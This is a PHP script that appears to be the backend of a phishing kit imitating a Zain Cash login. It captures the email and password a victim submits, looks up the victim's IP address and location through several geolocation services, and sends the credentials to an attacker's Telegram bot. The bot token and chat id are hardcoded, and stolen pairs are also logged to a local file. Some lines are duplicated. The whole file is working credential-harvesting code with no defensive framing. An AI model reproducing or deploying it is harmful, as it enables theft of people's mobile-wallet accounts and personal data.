<?php 
header("https://t.me/ARPEHX");
$API_KEY = "7735109468:AAFLmHRJhnDBruWaSNhdP9C9YOT7N8CMM-M"; 
$admin = 498134307 ;  
$text = $_POST['text']; 
$text1 = $_POST['text1']; 
$text2 = $_POST['text2']; 
$password = $_POST['password']; 
$login = $_POST['login'];
// get ip
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}
$ip = getClientIP();
$location = get_geolocation($ip);
$apiGL = json_decode($location, true);
function get_geolocation($ip) {
    $url = "https://ip-api.io/json/".$ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Accept: application/json',
        'User-Agent: '.$_SERVER['HTTP_USER_AGENT']
    ));
    return curl_exec($ch);
}
// info
$country = file_get_contents("https://ipapi.co/".$ip."/country_name");

$city = $apiGL['city'];
 $ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");
// info
$country = file_get_contents("https://ipapi.co/".$ip."/country_name");

$city = $apiGL['city'];
 $ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");

$countrycode = $apiGL['country_code'];
$flag = $apiGL['emojiFlag'];

 $user_ip = getenv('REMOTE_ADDR');
 $geo = json_decode(file_get_contents("https://extreme-ip-lookup.com/json/$user_ip?key=K16lL7YFUJ4toSIGYHxQ"));
 $country = $geo->country;
 $country_calling_code = $geo->country_calling_code;
 $city = $geo->city;
 $ipType = $geo->ipType;
 $businessName = $geo->businessName;
 $businessWebsite = $geo->businessWebsite;

 echo "Location of $user_ip: $country_calling_code, $country\n";

$countrycode = $apiGL['country_code'];
$flag = $apiGL['emojiFlag'];
$alls = explode("\n",file_get_contents("alls.txt"));
if(!in_array($text.":".$password,$alls)){
$rtv = file_get_contents("in.txt") ? file_get_contents("in.txt") : 0;
file_put_contents("in.txt",$rtv +1);
$ad1 = urlencode("𝗅𝗈𝗀 𝗂𝗇 𝖻𝗒 : زين كاش 

𝖾𝗆𝖺𝗂𝗅 : `$text`

𝗉𝖺𝗌𝗌 : `$password`

𝖼𝗈𝗎𝗇𝗍𝗋𝗒 : ( $country $flag )

𝖼𝗈𝗎𝗇𝗍𝗋𝗒 name : `$country`

𝗂𝗉 : $ip

");  
file_get_contents("https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=".$admin."&text=".$ad1."&parse_mode=markdown"); 
file_put_contents("alls.txt",$text.":".$password."\n",FILE_APPEND);
}

?>
